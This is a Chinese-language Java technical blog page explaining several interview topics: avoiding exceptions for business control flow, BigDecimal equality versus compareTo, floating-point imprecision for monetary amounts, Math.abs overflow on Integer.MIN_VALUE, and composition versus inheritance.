<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertData</span><span class="params">(Data data)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试插入数据</span></span><br><span class="line">        dataRepository.insert(data);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (DuplicateKeyException e) &#123;</span><br><span class="line">        <span class="comment">// 捕获唯一性约束冲突异常</span></span><br><span class="line">        <span class="type">Data</span> <span class="variable">existingData</span> <span class="operator">=</span> dataRepository.findByUniqueKey(data.getUniqueKey());</span><br><span class="line">        <span class="comment">// 返回已存在的数据，以实现幂等性</span></span><br><span class="line">        <span class="keyword">return</span> existingData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>这么做非常不建议，主要由以下几个问题：</p>
<p><strong>1、存在性能问题</strong>：在Java中，异常的生成和处理是昂贵的，因为它涉及到填充栈跟踪信息。频繁地抛出和捕获异常会导致性能下降。</p>
<p><strong>2、异常的职责就不是干这个的</strong>：Java中的异常被定义来处理一些非正常情况的，他的使用应该是比较谨慎的，异常应该用于处理非预期的错误情况，而不是利用它来控制正常的业务流程。使用异常控制业务流程会使代码的意图变得不清晰，增加了理解和维护代码的难度。</p>
<p><strong>3、异常的捕获会影响事务的回滚</strong>：这里代码很简单，可能不涉及到事务，但是如果本身这个方法还有很多其他的数据库操作逻辑，或者方法外嵌套了一层方法，那么就会可能会出现，因为异常被捕获而导致的事务无法回滚。</p>
<p><strong>4、过度依赖底层数据库异常</strong>：这里过度的依赖了DuplicateKeyException，万一哪一天这个异常发生了改变，比如版本升级了，或者底层数据库变了，不再抛出这个异常了，那这段代码就会失去作用，可能会导致意想不到的问题。</p>
<p>还有一点，那就是良好的API设计应该清晰地表达意图。如果API使用异常来表示常规的业务流程控制，这可能会误导API的使用者，使他们误解API的真正用途。</p>
<p>所以，不建议大家过度的使用异常，并且非常不建议使用异常来控制你的业务流程。</p>
<p>前面提到的幂等问题，要解决幂等问题，应该是先查，再改。如果为了防止并发，应该是一锁、二判、三更新。</p>
<h1 id="✅为什么不能用BigDecimal的equals方法做等值比较？"><a href="#✅为什么不能用BigDecimal的equals方法做等值比较？" class="headerlink" title="✅为什么不能用BigDecimal的equals方法做等值比较？"></a>✅为什么不能用BigDecimal的equals方法做等值比较？</h1><h2 id="典型回答-18"><a href="#典型回答-18" class="headerlink" title="典型回答"></a>典型回答</h2><p>因为BigDecimal的equals方法和compareTo并不一样，equals方法会比较两部分内容，分别是值（value）和标度（scale），而对于0.1和0.10这两个数字，他们的值虽然一样，但是精度是不一样的，所以在使用equals比较的时候会返回false。</p>
<h2 id="扩展知识-7"><a href="#扩展知识-7" class="headerlink" title="扩展知识"></a>扩展知识</h2><p>BigDecimal，相信对于很多人来说都不陌生，很多人都知道他的用法，这是一种java.math包中提供的一种可以用来进行精确运算的类型。</p>
<p>很多人都知道，在进行金额表示、金额计算等场景，不能使用double、float等类型，而是要使用对精度支持的更好的BigDecimal。</p>
<p>所以，很多支付、电商、金融等业务中，BigDecimal的使用非常频繁。而且不得不说这是一个非常好用的类，其内部自带了很多方法，如加，减，乘，除等运算方法都是可以直接调用的。</p>
<p>除了需要用BigDecimal表示数字和进行数字运算以外，代码中还经常需要对于数字进行相等判断。</p>
<p>关于这个知识点，在最新版的《阿里巴巴Java开发手册》中也有说明：</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/PWHChsjzVipEyBto/1668831646724-c382b461-bccd-4e54-95a8-ee08dde38a22-299589.jpeg" alt="1668831646724-c382b461-bccd-4e54-95a8-ee08dde38a22.jpeg"></p>
<p>这背后的思考是什么呢？</p>
<h2 id="BigDecimal的比较"><a href="#BigDecimal的比较" class="headerlink" title="BigDecimal的比较"></a>BigDecimal的比较</h2><p>我在之前的CodeReview中，看到过以下这样的低级错误：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(bigDecimal == bigDecimal1)&#123;</span><br><span class="line">    // 两个数相等</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这种错误，相信聪明的读者一眼就可以看出问题，<strong>因为BigDecimal是对象，所以不能用</strong><code>**==**</code><strong>来判断两个数字的值是否相等。</strong></p>
<p>以上这种问题，在有一定的经验之后，还是可以避免的，但是聪明的读者，看一下以下这行代码，你觉得他有问题吗：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(bigDecimal.equals(bigDecimal1))&#123;</span><br><span class="line">    // 两个数相等</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以明确的告诉大家，以上这种写法，可能得到的结果和你预想的不一样！</p>
<p>先来做个实验，运行以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BigDecimal bigDecimal = new BigDecimal(1);</span><br><span class="line">BigDecimal bigDecimal1 = new BigDecimal(1);</span><br><span class="line">System.out.println(bigDecimal.equals(bigDecimal1));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BigDecimal bigDecimal2 = new BigDecimal(1);</span><br><span class="line">BigDecimal bigDecimal3 = new BigDecimal(1.0);</span><br><span class="line">System.out.println(bigDecimal2.equals(bigDecimal3));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BigDecimal bigDecimal4 = new BigDecimal(&quot;1&quot;);</span><br><span class="line">BigDecimal bigDecimal5 = new BigDecimal(&quot;1.0&quot;);</span><br><span class="line">System.out.println(bigDecimal4.equals(bigDecimal5));</span><br></pre></td></tr></table></figure>



<p>以上代码，输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">true</span><br><span class="line">true</span><br><span class="line">false</span><br></pre></td></tr></table></figure>



<h2 id="BigDecimal的equals原理"><a href="#BigDecimal的equals原理" class="headerlink" title="BigDecimal的equals原理"></a>BigDecimal的equals原理</h2><p>通过以上代码示例，我们发现，在使用BigDecimal的equals方法对1和1.0进行比较的时候，有的时候是true（当使用int、double定义BigDecimal时），有的时候是false（当使用String定义BigDecimal时）。</p>
<p>那么，为什么会出现这样的情况呢，我们先来看下BigDecimal的equals方法。</p>
<p>在BigDecimal的JavaDoc中其实已经解释了其中原因：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Compares this  BigDecimal with the specified Object for equality.  Unlike compareTo, this method considers two BigDecimal objects equal only if they are equal in value and scale (thus 2.0 is not equal to 2.00 when compared by  this method)</span><br></pre></td></tr></table></figure>



<p>大概意思就是，<strong>equals方法和compareTo并不一样，equals方法会比较两部分内容，分别是值（value）和标度（scale）</strong></p>
<p>对应的代码如下：</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/PWHChsjzVipEyBto/1695125002306-807827b1-f205-422d-988d-515d21d19208-181546.jpeg" alt="1695125002306-807827b1-f205-422d-988d-515d21d19208.jpeg"></p>
<p>所以，我们以上代码定义出来的两个BigDecimal对象（bigDecimal4和bigDecimal5）的标度是不一样的，所以使用equals比较的结果就是false了。</p>
<p>尝试着对代码进行debug，在debug的过程中我们也可以看到bigDecimal4的标度是0，而bigDecimal5的标度是1。</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/PWHChsjzVipEyBto/1695124997490-9243505e-184c-49d7-99cb-5ac609e4a38c-976007.jpeg" alt="1695124997490-9243505e-184c-49d7-99cb-5ac609e4a38c.jpeg"></p>
<p>到这里，我们大概解释清楚了，之所以equals比较bigDecimal4和bigDecimal5的结果是false，是因为标度不同。</p>
<p>那么，为什么标度不同呢？为什么bigDecimal2和bigDecimal3的标度是一样的（当使用int、double定义BigDecimal时），而bigDecimal4和bigDecimal5却不一样（当使用String定义BigDecimal时）呢？</p>
<h2 id="为什么标度不同"><a href="#为什么标度不同" class="headerlink" title="为什么标度不同"></a>为什么标度不同</h2><p>这个就涉及到BigDecimal的标度问题了，这个问题其实是比较复杂的，由于不是本文的重点，这里面就简单介绍一下吧。大家感兴趣的话，后面单独讲。</p>
<p>首先，BigDecimal一共有以下4个构造方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BigDecimal(int)</span><br><span class="line">BigDecimal(double) </span><br><span class="line">BigDecimal(long) </span><br><span class="line">BigDecimal(String)</span><br></pre></td></tr></table></figure>



<p>以上四个方法，创建出来的的BigDecimal的标度是不同的。</p>
<h4 id="BigDecimal-long-和BigDecimal-int"><a href="#BigDecimal-long-和BigDecimal-int" class="headerlink" title="BigDecimal(long) 和BigDecimal(int)"></a>BigDecimal(long) 和BigDecimal(int)</h4><p>首先，最简单的就是<strong>BigDecimal(long) 和BigDecimal(int)，因为是整数，所以标度就是0</strong> ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public BigDecimal(int val) &#123;</span><br><span class="line">    this.intCompact = val;</span><br><span class="line">    this.scale = 0;</span><br><span class="line">    this.intVal = null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public BigDecimal(long val) &#123;</span><br><span class="line">    this.intCompact = val;</span><br><span class="line">    this.intVal = (val == INFLATED) ? INFLATED_BIGINT : null;</span><br><span class="line">    this.scale = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="BigDecimal-double"><a href="#BigDecimal-double" class="headerlink" title="BigDecimal(double)"></a>BigDecimal(double)</h4><p>而对于BigDecimal(double) ，<strong>当我们使用new BigDecimal(0.1)创建一个BigDecimal 的时候，其实创建出来的值并不是整好等于0.1的，而是0.1000000000000000055511151231257827021181583404541015625 。这是因为double自身表示的只是一个近似值。</strong></p>
<p>那么，无论我们使用new BigDecimal(0.1)还是new BigDecimal(0.10)定义，他的近似值都是0.1000000000000000055511151231257827021181583404541015625这个，那么他的标度就是这个数字的位数，即55。</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/PWHChsjzVipEyBto/1695124991568-c8792b40-c95e-4f7c-a1be-7182e743c4f0-704534.jpeg" alt="1695124991568-c8792b40-c95e-4f7c-a1be-7182e743c4f0.jpeg"></p>
<p>其他的浮点数也同样的道理。对于new BigDecimal(1.0)这样的形式来说，因为他本质上也是个整数，所以他创建出来的数字的标度就是0。</p>
<p>所以，因为BigDecimal(1.0)和BigDecimal(1.00)的标度是一样的，所以在使用equals方法比较的时候，得到的结果就是true。</p>
<h4 id="BigDecimal-string"><a href="#BigDecimal-string" class="headerlink" title="BigDecimal(string)"></a>BigDecimal(string)</h4><p>而对于BigDecimal(String) ，<strong>当我们使用new BigDecimal(“0.1”)创建一个BigDecimal 的时候，其实创建出来的值正好就是等于0.1的。那么他的标度也就是1。</strong></p>
<p>如果使用new BigDecimal(“0.10000”)，那么创建出来的数就是0.10000，标度也就是5。</p>
<p>所以，因为BigDecimal(“1.0”)和BigDecimal(“1.00”)的标度不一样，所以在使用equals方法比较的时候，得到的结果就是false。</p>
<h2 id="如何比较BigDecimal"><a href="#如何比较BigDecimal" class="headerlink" title="如何比较BigDecimal"></a>如何比较BigDecimal</h2><p>前面，我们解释了BigDecimal的equals方法，其实不只是会比较数字的值，还会对其标度进行比较。</p>
<p>所以，当我们使用equals方法判断判断两个数是否相等的时候，是极其严格的。</p>
<p>那么，如果我们只想判断两个BigDecimal的值是否相等，那么该如何判断呢？</p>
<p><strong>BigDecimal中提供了compareTo方法，这个方法就可以只比较两个数字的值，如果两个数相等，则返回0。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BigDecimal bigDecimal4 = new BigDecimal(&quot;1&quot;);</span><br><span class="line">BigDecimal bigDecimal5 = new BigDecimal(&quot;1.0000&quot;);</span><br><span class="line">System.out.println(bigDecimal4.compareTo(bigDecimal5));</span><br></pre></td></tr></table></figure>



<p>以上代码，输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure>



<p>其源码如下：</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/PWHChsjzVipEyBto/1695124985446-358e1085-59f5-44a5-bf14-944d5facc085-284440.jpeg" alt="1695124985446-358e1085-59f5-44a5-bf14-944d5facc085.jpeg"></p>
<h1 id="✅为什么不能用浮点数表示金额？"><a href="#✅为什么不能用浮点数表示金额？" class="headerlink" title="✅为什么不能用浮点数表示金额？"></a>✅为什么不能用浮点数表示金额？</h1><h2 id="典型回答-19"><a href="#典型回答-19" class="headerlink" title="典型回答"></a>典型回答</h2><p>因为不是所有的小数都能用二进制表示（扩展知识中介绍为啥不能表示），所以，为了解决这个问题，IEEE<strong>提出了一种使用近似值表示小数的方式，并且引入了精度的概念。这就是我们所熟知的浮点数。</strong></p>
<hr>
<p>比如0.1+0.2 !&#x3D; 0.3，而是等于0.30000000000000004 （甚至有一个网站就叫做 <a target="_blank" rel="noopener" href="https://0.30000000000000004.com/">https://0.30000000000000004.com/</a> ，就是来解释这个现象的）</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/GM7h9pXfmQ_6p-Sc/1705323582322-db6091dd-8ba3-4249-8ba3-5fe8388f7f92-058362.png" alt="1705323582322-db6091dd-8ba3-4249-8ba3-5fe8388f7f92.png"></p>
<hr>
<p><strong>所以，浮点数只是近似值，并不是精确值，所以不能用来表示金额。否则会有精度丢失。</strong></p>
<h2 id="扩展知识-8"><a href="#扩展知识-8" class="headerlink" title="扩展知识"></a>扩展知识</h2><h3 id="十进制转二进制"><a href="#十进制转二进制" class="headerlink" title="十进制转二进制"></a>十进制转二进制</h3><p>首先我们看一下，<strong>如何把十进制整数转换成二进制整数？</strong></p>
<p>十进制整数转换为二进制整数采用”除2取余，逆序排列”法。</p>
<p>具体做法是：</p>
<ul>
<li>用2整除十进制整数，可以得到一个商和余数；</li>
<li>再用2去除商，又会得到一个商和余数，如此进行，直到商为小于1时为止</li>
<li>然后把先得到的余数作为二进制数的低位有效位，后得到的余数作为二进制数的高位有效位，依次排列起来。</li>
</ul>
<p>如，我们想要把127转换成二进制，做法如下：</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/GM7h9pXfmQ_6p-Sc/1668831261769-fc28aa7b-e539-428b-af3b-b03f772d2a6d-991301.jpeg" alt="1668831261769-fc28aa7b-e539-428b-af3b-b03f772d2a6d.jpeg"></p>
<p>那么，<strong>十进制小数转换成二进制小数，又该如何计算呢？</strong></p>
<p>十进制小数转换成二进制小数采用”乘2取整，顺序排列”法。</p>
<p>具体做法是：</p>
<ul>
<li>用2乘十进制小数，可以得到积</li>
<li>将积的整数部分取出，再用2乘余下的小数部分，又得到一个积</li>
<li>再将积的整数部分取出，如此进行，直到积中的小数部分为零，此时0或1为二进制的最后一位。或者达到所要求的精度为止。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/GM7h9pXfmQ_6p-Sc/1668831261784-23191a6f-9697-4e28-9c67-05286f3939b7-261007.jpeg" alt="1668831261784-23191a6f-9697-4e28-9c67-05286f3939b7.jpeg"></p>
<p>所以，十进制的0.625对应的二进制就是0.101。</p>
<h3 id="不是所有数都能用二进制表示"><a href="#不是所有数都能用二进制表示" class="headerlink" title="不是所有数都能用二进制表示"></a>不是所有数都能用二进制表示</h3><p>我们知道了如何将一个十进制小数转换成二进制，那么是不是计算就可以直接用二进制表示小数了呢？</p>
<p>前面我们的例子中0.625是一个特列，那么还是用同样的算法，请计算下0.1对应的二进制是多少？</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/GM7h9pXfmQ_6p-Sc/1668831261776-8d3d001c-341d-458f-bcc2-75294ea4d8ab-869901.jpeg" alt="1668831261776-8d3d001c-341d-458f-bcc2-75294ea4d8ab.jpeg"></p>
<p>我们发现，0.1的二进制表示中出现了无限循环的情况，也就是(0.1)10 &#x3D; (0.000110011001100…)2</p>
<p>这种情况，计算机就没办法用二进制精确的表示0.1了。</p>
<p><strong>也就是说，对于像0.1这种数字，我们是没办法将他转换成一个确定的二进制数的。</strong></p>
<h3 id="IEEE-754"><a href="#IEEE-754" class="headerlink" title="IEEE 754"></a>IEEE 754</h3><p>为了解决部分小数无法使用二进制精确表示的问题，于是就有了IEEE 754规范。</p>
<p>IEEE二进制浮点数算术标准（IEEE 754）是20世纪80年代以来最广泛使用的浮点数运算标准，为许多CPU与浮点运算器所采用。</p>
<blockquote>
<p>浮点数和小数并不是完全一样的，计算机中小数的表示法，其实有定点和浮点两种。因为在位数相同的情况下，定点数的表示范围要比浮点数小。所以在计算机科学中，使用浮点数来表示实数的近似值。</p>
</blockquote>
<p>IEEE 754规定了四种表示浮点数值的方式：单精确度（32位）、双精确度（64位）、延伸单精确度（43比特以上，很少使用）与延伸双精确度（79比特以上，通常以80位实现）。</p>
<p>其中最常用的就是32位单精度浮点数和64位双精度浮点数。</p>
<p><strong>IEEE并没有解决小数无法精确表示的问题，只是提出了一种使用近似值表示小数的方式，并且引入了精度的概念。</strong></p>
<p>浮点数是一串0和1构成的位序列(bit sequence)，从逻辑上用三元组{S,E,M}表示一个数N,如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/GM7h9pXfmQ_6p-Sc/1668831261781-ee0b02d3-5e60-4c84-94fb-1ed67fdd848a-597737.jpeg" alt="1668831261781-ee0b02d3-5e60-4c84-94fb-1ed67fdd848a.jpeg"></p>
<ul>
<li>S(sign)表示N的符号位。对应值s满足：n&gt;0时，s&#x3D;0; n≤0时，s&#x3D;1。</li>
<li>E(exponent)表示N的指数位，位于S和M之间的若干位。对应值e值也可正可负。</li>
<li>M(mantissa)表示N的尾数位，恰好，它位于N末尾。M也叫有效数字位（significand）、系数位（coefficient）, 甚至被称作”小数”。</li>
</ul>
<p>则浮点数N的实际值n由下方的式子表示：</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/GM7h9pXfmQ_6p-Sc/1668831261782-f870cc7f-af15-4bf3-abef-32f18af1d72c-697572.jpeg" alt="1668831261782-f870cc7f-af15-4bf3-abef-32f18af1d72c.jpeg"></p>
<p>上面这个公式看起来很复杂，其中符号位和尾数位还比较容易理解，但是这个指数位就不是那么容易理解了。</p>
<p>其实，大家也不用太过于纠结这个公式，大家只需要知道对于单精度浮点数，最多只能用32位字符表示一个数字，双精度浮点数最多只能用64位来表示一个数字。</p>
<p><strong>而对于那些无限循环的二进制数来说，计算机采用浮点数的方式保留了一定的有效数字，那么这个值只能是近似值，不可能是真实值。</strong></p>
<p>至于一个数对应的IEEE 754浮点数应该如何计算，不是本文的重点，这里就不再赘述了，过程还是比较复杂的，需要进行对阶、尾数求和、规格化、舍入以及溢出判断等。</p>
<p>但是这些其实不需要了解的太详细，我们只需要知道，小数在计算机中的表示是近似数，并不是真实值。根据精度不同，近似程度也有所不同。</p>
<p>如0.1这个小数，他对应的在双精度浮点数的二进制为：0.00011001100110011001100110011001100110011001100110011001 。</p>
<p>0.2这个小数0.00110011001100110011001100110011001100110011001100110011 。</p>
<p>所以两者相加：</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/GM7h9pXfmQ_6p-Sc/1668831262016-d222a4ac-7301-4ce3-a6f8-14d3a87602df-034823.jpeg" alt="1668831262016-d222a4ac-7301-4ce3-a6f8-14d3a87602df.jpeg"></p>
<p>转换成10进制之后得到：0.30000000000000004！</p>
<h3 id="避免精度丢失"><a href="#避免精度丢失" class="headerlink" title="避免精度丢失"></a>避免精度丢失</h3><p>在Java中，使用float表示单精度浮点数，double表示双精度浮点数，表示的都是近似值。</p>
<p>所以，在Java代码中，千万不要使用float或者double来进行高精度运算，尤其是金额运算，否则就很容易产生资损问题。</p>
<p>为了解决这样的精度问题，Java中提供了BigDecimal来进行精确运算。</p>
<h1 id="✅为什么对Java中的负数取绝对值结果不一定是正数？"><a href="#✅为什么对Java中的负数取绝对值结果不一定是正数？" class="headerlink" title="✅为什么对Java中的负数取绝对值结果不一定是正数？"></a>✅为什么对Java中的负数取绝对值结果不一定是正数？</h1><h2 id="典型回答-20"><a href="#典型回答-20" class="headerlink" title="典型回答"></a>典型回答</h2><p>假如，我们要用Math.abs对一个Integer取绝对值的时候，如果用如下方式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.abs(orderId.hashCode());	</span><br></pre></td></tr></table></figure>



<p> 得到的结果可能是个负数。原因要从Integer的取值范围说起，int的取值范围是-2^31 —— (2^31) - 1，即-2147483648 至 2147483647</p>
<p>那么，当我们使用abs取绝对值时候，想要取得-2147483648的绝对值，那应该是2147483648。但是，2147483648大于了2147483647，即超过了int的取值范围。这时候就会发生越界。</p>
<p>2147483647用二进制的补码表示是：<code>01111111 11111111 11111111 11111111</code></p>
<p>这个数 +1 得到：<code>10000000 00000000 00000000 00000000</code></p>
<p>这个二进制就是-2147483648的补码。</p>
<p>虽然，这种情况发生的概率很低，<strong>只有当要取绝对值的数字是-2147483648的时候，得到的数字还是个负数。</strong></p>
<p>那么，如何解决这个问题呢？</p>
<p>既然是因为越界了导致最终结果变成负数，那就解决越界的问题就行了，那就是在取绝对值之前，把这个int类型转成long类型，这样就不会出现越界了。</p>
<p>如，前面我们取值逻辑修改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.abs((long)orderId.hashCode()); </span><br></pre></td></tr></table></figure>



<p>就万无一失了。</p>
<p>大家可以执行下以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    System.out.println(Math.abs((long)Integer.MIN_VALUE));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>得到的结果就是：</p>
<pre><code>2147483648
</code></pre>
<h2 id="扩展知识-9"><a href="#扩展知识-9" class="headerlink" title="扩展知识"></a>扩展知识</h2><h2 id="整型的取值范围"><a href="#整型的取值范围" class="headerlink" title="整型的取值范围"></a>整型的取值范围</h2><p>Java中的整型主要包含byte、short、int和long这四种，表示的数字范围也是从小到大的，之所以表示范围不同主要和他们存储数据时所占的字节数有关。</p>
<p>先来个简单的科普，1字节&#x3D;8位（bit）。java中的整型属于有符号数。</p>
<p>先来看计算中8bit可以表示的数字：</p>
<p>最小值：10000000 （-128）(-2^7) 最大值：01111111（127）(2^7-1)</p>
<p>整型的这几个类型中，</p>
<ul>
<li>byte：byte用1个字节来存储，范围为-128(-2^7)到127(2^7-1)，在变量初始化的时候，byte类型的默认值为0。</li>
<li>short：short用2个字节存储，范围为-32,768 (-2^15)到32,767 (2^15-1)，在变量初始化的时候，short类型的默认值为0，一般情况下，因为Java本身转型的原因，可以直接写为0。</li>
<li>int：int用4个字节存储，范围为-2,147,483,648 (-2^31)到2,147,483,647 (2^31-1)，在变量初始化的时候，int类型的默认值为0。</li>
<li>long：long用8个字节存储，范围为-9,223,372,036,854,775,808 (-2^63)到9,223,372,036, 854,775,807 (2^63-1)，在变量初始化的时候，long类型的默认值为0L或0l，也可直接写为0。</li>
</ul>
<h3 id="超出范围怎么办"><a href="#超出范围怎么办" class="headerlink" title="超出范围怎么办"></a>超出范围怎么办</h3><p>上面说过了，整型中，每个类型都有一定的表示范围，但是，在程序中有些计算会导致超出表示范围，即溢出。如以下代码：</p>
<pre><code>int i = Integer.MAX_VALUE;     int j = Integer.MAX_VALUE;     int k = i + j;     System.out.println(&quot;i (&quot; + i + &quot;) + j (&quot; + j + &quot;) = k (&quot; + k + &quot;)&quot;);
</code></pre>
<p>输出结果：i (2147483647) + j (2147483647) &#x3D; k (-2)</p>
<p>**这就是发生了溢出，溢出的时候并不会抛异常，也没有任何提示。**所以，在程序中，使用同类型的数据进行运算的时候，<strong>一定要注意数据溢出的问题。</strong></p>
<h1 id="✅为什么建议多用组合少用继承？"><a href="#✅为什么建议多用组合少用继承？" class="headerlink" title="✅为什么建议多用组合少用继承？"></a>✅为什么建议多用组合少用继承？</h1><h2 id="典型回答-21"><a href="#典型回答-21" class="headerlink" title="典型回答"></a>典型回答</h2><p>作为一门面向对象开发的语言，代码复用是Java引人注意的功能之一。Java代码的复用有继承，组合以及代理三种具体的表现形式。</p>
<p>复用性是面向对象技术带来的很棒的潜在好处之一。如果运用的好的话可以帮助我们节省很多开发时间，提升开发效率。但是，如果被滥用那么就可能产生很多难以维护的代码。</p>
<p>继承（Inheritance）是一种联结类与类的层次模型。指的是一个类（称为子类、子接口）继承另外的一个类（称为父类、父接口）的功能，并可以增加它自己的新功能的能力，继承是类与类或者接口与接口之间最常见的关系；继承是一种<code>is-a</code>关系。如狗是一种动物，特斯拉是一种车</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/GQkq0sC-69w523z0/1699618236124-01fee750-fc36-4187-b1c5-2d72d17007b9-077425.jpeg" alt="1699618236124-01fee750-fc36-4187-b1c5-2d72d17007b9.jpeg"></p>
<p>组合(Composition)体现的是整体与部分、拥有的关系，即has-a的关系。如狗有一个尾巴，特斯拉有轮子</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/GQkq0sC-69w523z0/1699618236125-61427e45-5e8c-426d-a7c4-ee5d65d8340f-170536.jpeg" alt="1699618236125-61427e45-5e8c-426d-a7c4-ee5d65d8340f.jpeg"></p>
<h3 id="组合与继承的区别和联系"><a href="#组合与继承的区别和联系" class="headerlink" title="组合与继承的区别和联系"></a>组合与继承的区别和联系</h3><p>在继承结构中，父类的内部细节对于子类是可见的。所以我们通常也可以说通过继承的代码复用是一种<strong>白盒式代码复用</strong>。（如果基类的实现发生改变，那么派生类的实现也将随之改变。这样就导致了子类行为的不可预知性；）</p>
<p><strong>继承，在写代码的时候就要指名具体继承哪个类，所以，在编译期就确定了关系</strong>。（从基类继承来的实现是无法在运行期动态改变的，因此降低了应用的灵活性。）</p>
<p>组合是通过对现有的对象进行拼装（组合）产生新的、更复杂的功能。因为在对象之间，各自的内部细节是不可见的，所以我们也说这种方式的代码复用是<strong>黑盒式代码复用</strong>。（因为组合中一般都定义一个类型，所以在编译期根本不知道具体会调用哪个实现类的方法）</p>
<p><strong>组合，在写代码的时候可以采用面向接口编程。所以，类的组合关系一般在运行期确定。</strong></p>
<h3 id="优缺点对比"><a href="#优缺点对比" class="headerlink" title="优缺点对比"></a>优缺点对比</h3><table>
<thead>
<tr>
<th>组 合 关 系</th>
<th>继 承 关 系</th>
</tr>
</thead>
<tbody><tr>
<td>优点：不破坏封装，整体类与局部类之间松耦合，彼此相对独立</td>
<td>缺点：破坏封装，子类与父类之间紧密耦合，子类依赖于父类的实现，子类缺乏独立性</td>
</tr>
<tr>
<td>优点：具有较好的可扩展性</td>
<td>缺点：支持扩展，但是往往以增加系统结构的复杂度为代价</td>
</tr>
<tr>
<td>优点：支持动态组合。在运行时，整体对象可以选择不同类型的局部对象</td>
<td>缺点：不支持动态继承。在运行时，子类无法选择不同的父类</td>
</tr>
<tr>
<td>优点：整体类可以对局部类进行包装，封装局部类的接口，提供新的接口</td>
<td>缺点：子类不能改变父类的接口</td>
</tr>
<tr>
<td>缺点：整体类不能自动获得和局部类同样的接口</td>
<td>优点：子类能自动继承父类的接口</td>
</tr>
<tr>
<td>缺点：创建整体类的对象时，需要创建所有局部类的对象</td>
<td>优点：创建子类的对象时，无须创建父类的对象</td>
</tr>
</tbody></table>
